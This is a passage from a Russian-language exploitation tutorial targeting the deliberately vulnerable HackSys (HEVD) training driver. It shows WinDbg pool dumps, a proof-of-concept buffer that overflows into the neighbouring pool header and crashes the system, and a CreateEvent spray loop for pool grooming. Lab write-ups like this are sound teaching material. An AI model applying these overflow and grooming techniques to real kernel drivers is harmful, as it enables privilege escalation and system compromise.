<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Chunk</span><span class="p">:</span> <span class="mh">0x8509E008</span>
<span class="o">******</span> <span class="nx">HACKSYS_EVD_IOCTL_POOL_OVERFLOW</span> <span class="o">******</span>
</code></pre></div></div>

<p>Попробуем длину ровно 0x1F8, будем на границе допустимого:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">g</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Allocating</span> <span class="nx">Pool</span> <span class="nx">chunk</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Tag</span><span class="p">:</span> <span class="dl">'</span><span class="s1">kcaH</span><span class="dl">'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Type</span><span class="p">:</span> <span class="nx">NonPagedPool</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Chunk</span><span class="p">:</span> <span class="mh">0x850C4D50</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserBuffer</span><span class="p">:</span> <span class="mh">0x00375668</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserBuffer</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">KernelBuffer</span><span class="p">:</span> <span class="mh">0x850C4D50</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">KernelBuffer</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Pool</span> <span class="nx">Overflow</span>


<span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mh">0x850C4D50</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="mi">850</span><span class="nx">c4d50</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="mi">850</span><span class="nx">c4000</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4048</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4090</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c40d8</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4120</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4168</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">FSro</span>
 <span class="mi">850</span><span class="nx">c4190</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">b8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">File </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">c4248</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">b8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfi</span>
 <span class="mi">850</span><span class="nx">c4370</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">MmCa</span>
 <span class="mi">850</span><span class="nx">c4408</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">168</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">CcSc</span>
 <span class="mi">850</span><span class="nx">c4570</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">68</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">168</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">FMsl</span>
 <span class="mi">850</span><span class="nx">c45d8</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">c8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">68</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfx</span>
 <span class="mi">850</span><span class="nx">c46a0</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">b8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">c8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">File </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">c4758</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">b8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfi</span>
 <span class="mi">850</span><span class="nx">c4880</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">MmCa</span>
 <span class="mi">850</span><span class="nx">c4918</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">CcSc</span>
 <span class="mi">850</span><span class="nx">c4940</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Io</span>   <span class="nx">Process</span><span class="p">:</span> <span class="mi">86</span><span class="nx">db94b8</span>
 <span class="mi">850</span><span class="nx">c4a80</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfi</span>
 <span class="mi">850</span><span class="nx">c4ba8</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">b8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">File </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">c4c60</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">c8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">b8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfx</span>
 <span class="mi">850</span><span class="nx">c4d28</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">20</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">c8  </span><span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">Io</span>  
<span class="o">*</span><span class="mi">850</span><span class="nx">c4d48</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">20</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
    <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">c4f48</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">b8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">File </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>


 <span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="mi">850</span><span class="nx">c4d48</span> <span class="nx">L90</span>
<span class="mi">850</span><span class="nx">c4d48</span>  <span class="mi">04400004</span> <span class="mi">6</span><span class="nx">b636148</span> <span class="mi">00000000</span> <span class="mi">0030</span><span class="nx">e810</span>
<span class="mi">850</span><span class="nx">c4d58</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4d68</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4d78</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4d88</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4d98</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4da8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4db8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4dc8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4dd8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4de8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4df8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e08</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e18</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e28</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e38</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e48</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e58</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e68</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e78</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e88</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4e98</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4ea8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4eb8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4ec8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4ed8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4ee8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4ef8</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4f08</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4f18</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4f28</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4f38</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">850</span><span class="nx">c4f48</span>  <span class="mi">04170040</span> <span class="nx">e56c6946</span> <span class="mi">00000400</span> <span class="mi">000000</span><span class="nx">f8</span>
<span class="mi">850</span><span class="nx">c4f58</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">850</span><span class="nx">c4f68</span>  <span class="mi">00000001</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">400</span><span class="nx">c001c</span>
<span class="mi">850</span><span class="nx">c4f78</span>  <span class="mi">82746</span><span class="nx">b40</span> <span class="mi">00000000</span> <span class="mi">00800005</span> <span class="mi">854962</span><span class="nx">c0</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="mi">850</span><span class="nx">c4f48</span>
<span class="mi">850</span><span class="nx">c4f48</span>  <span class="mi">04170040</span> <span class="nx">e56c6946</span> <span class="mi">00000400</span> <span class="mi">000000</span><span class="nx">f8</span>
<span class="mi">850</span><span class="nx">c4f58</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">850</span><span class="nx">c4f68</span>  <span class="mi">00000001</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">400</span><span class="nx">c001c</span>
<span class="mi">850</span><span class="nx">c4f78</span>  <span class="mi">82746</span><span class="nx">b40</span> <span class="mi">00000000</span> <span class="mi">00800005</span> <span class="mi">854962</span><span class="nx">c0</span>

<span class="nx">Видим</span><span class="p">,</span> <span class="nx">что</span> <span class="nx">влезли</span> <span class="nx">идеально</span>
<span class="p">...</span>
<span class="kd">const</span> <span class="nx">char</span><span class="o">*</span> <span class="nx">poc</span> <span class="o">=</span> <span class="nx">std</span><span class="p">::</span><span class="nf">string</span><span class="p">(</span><span class="mh">0x1f8</span><span class="p">,</span> <span class="dl">'</span><span class="s1">A</span><span class="dl">'</span><span class="p">).</span><span class="nf">c_str</span><span class="p">();</span>
<span class="p">...</span>
<span class="nc">DeviceIoControl</span><span class="p">(</span><span class="nx">hDevice</span><span class="p">,</span> <span class="nx">IO_CODE</span><span class="p">,</span> <span class="p">(</span><span class="nx">LPVOID</span><span class="p">)</span><span class="nx">poc</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="nx">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">bytesRetn</span><span class="p">,</span> <span class="nx">NULL</span><span class="p">);</span>
<span class="p">...</span>

<span class="nx">Впереди</span> <span class="nx">нашего</span> <span class="nx">чанка</span> <span class="nx">хедер</span> <span class="nx">следующего</span><span class="p">,</span> <span class="nx">если</span> <span class="nx">мы</span> <span class="nx">его</span> <span class="nx">покорраптим</span><span class="p">,</span> <span class="nx">улетим</span> <span class="nx">в</span> <span class="nx">BSOD</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dd</span> <span class="mi">850</span><span class="nx">c4f48</span><span class="o">-</span><span class="mi">8</span>
<span class="mi">850</span><span class="nx">c4f40</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">04170040</span> <span class="nx">e56c6946</span>
<span class="mi">850</span><span class="nx">c4f50</span>  <span class="mi">00000400</span> <span class="mi">000000</span><span class="nx">f8</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">850</span><span class="nx">c4f60</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000001</span> <span class="mi">00000000</span>

</code></pre></div></div>

<p>Поменяем длину на 0x200 и посмотрим, что будет:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mh">0x850C4D50</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="mi">850</span><span class="nx">c4d50</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="mi">850</span><span class="nx">c4000</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4048</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4090</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c40d8</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4120</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Vad</span> 
 <span class="mi">850</span><span class="nx">c4168</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">FSro</span>
 <span class="mi">850</span><span class="nx">c4190</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">b8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">File </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">c4248</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">b8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfi</span>
 <span class="mi">850</span><span class="nx">c4370</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">MmCa</span>
 <span class="mi">850</span><span class="nx">c4408</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">168</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">CcSc</span>
 <span class="mi">850</span><span class="nx">c4570</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">68</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">168</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">FMsl</span>
 <span class="mi">850</span><span class="nx">c45d8</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">c8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">68</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfx</span>
 <span class="mi">850</span><span class="nx">c46a0</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">b8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">c8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">File </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">c4758</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">b8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfi</span>
 <span class="mi">850</span><span class="nx">c4880</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">MmCa</span>
 <span class="mi">850</span><span class="nx">c4918</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">98</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">CcSc</span>
 <span class="mi">850</span><span class="nx">c4940</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">28</span>  <span class="p">(</span><span class="nx">Free</span> <span class="p">)</span>  <span class="nx">Io</span>   <span class="nx">Process</span><span class="p">:</span> <span class="mi">86</span><span class="nx">db94b8</span>
 <span class="mi">850</span><span class="nx">c4a80</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">140</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfi</span>
 <span class="mi">850</span><span class="nx">c4ba8</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">b8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">128</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">File </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">c4c60</span> <span class="nx">size</span><span class="p">:</span>   <span class="nx">c8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">b8  </span><span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nx">Ntfx</span>
 <span class="mi">850</span><span class="nx">c4d28</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">20</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="nf">c8  </span><span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">Io</span>  
<span class="o">*</span><span class="mi">850</span><span class="nx">c4d48</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">20</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="nx">Hack</span>
    <span class="nx">Owning</span> <span class="nx">component</span> <span class="p">:</span> <span class="nc">Unknown </span><span class="p">(</span><span class="nx">update</span> <span class="nx">pooltag</span><span class="p">.</span><span class="nx">txt</span><span class="p">)</span>

<span class="mi">850</span><span class="nx">c4f48</span> <span class="nx">doesn</span><span class="dl">'</span><span class="s1">t look like a valid small pool allocation, checking to see
if the entire page is actually part of a large page allocation...

850c4f48 is not a valid large pool allocation, checking large session pool...
850c4f48 is not valid pool. Checking for freed (or corrupt) pool
Bad previous allocation size @850c4f48, last size was 40


kd&gt; dd 850c4f48-8
ReadVirtual: 850c4f40 not properly sign extended
850c4f40  41414141 41414141 41414141 41414141
850c4f50  00000400 000000f8 00000000 00000000
850c4f60  00000000 00000000 00000001 00000000
850c4f70  00000000 400c001c 82746b40 00000000

A fatal system error has occurred.
</span></code></pre></div></div>

<p>Интересная вещь, которую нужно отметить - это как мы на самом деле можем контроилровать соседний заголовок с помощью нашего переполнения. Это уязвимость, которую мы будем эксплуатировать грумингом(?) предсказуемым образом, избавлясь от рандома в нашем пуле. Для этого упомянутый ранее CreateEvent подходит идеально, так как он имее тразмер 0x40, который идеально подойдёт для размера нашего пула 0x200</p>

<p>Мы будем спреить большое количество объектов событий, хранить хендлы на них в массивах и смотреть, как это влияет на пул</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">spray_event1</span><span class="p">[</span><span class="mi">10000</span><span class="p">];</span>
<span class="n">HANDLE</span> <span class="n">spray_event2</span><span class="p">[</span><span class="mi">5000</span><span class="p">];</span>

<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">spray_event1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateEventA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">spray_event2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateEventA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">pool</span> <span class="mh">0x850B4620</span>
<span class="nx">Pool</span> <span class="nx">page</span> <span class="mi">850</span><span class="nx">b4620</span> <span class="nx">region</span> <span class="nx">is</span> <span class="nx">Unknown</span>
 <span class="mi">850</span><span class="nx">b4000</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="nx">Allocated</span><span class="p">)</span>  <span class="nc">Even </span><span class="p">(</span><span class="nx">Protected</span><span class="p">)</span>
 <span class="mi">850</span><span class="nx">b4040</span> <span class="nx">size</span><span class="p">:</span>  <span class="mi">5</span><span class="nx">d8</span> <span class="nx">previous</span> <span class="nx">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="nx">Free</span><span class="p">)</span>       <span class="nx">pter</span>
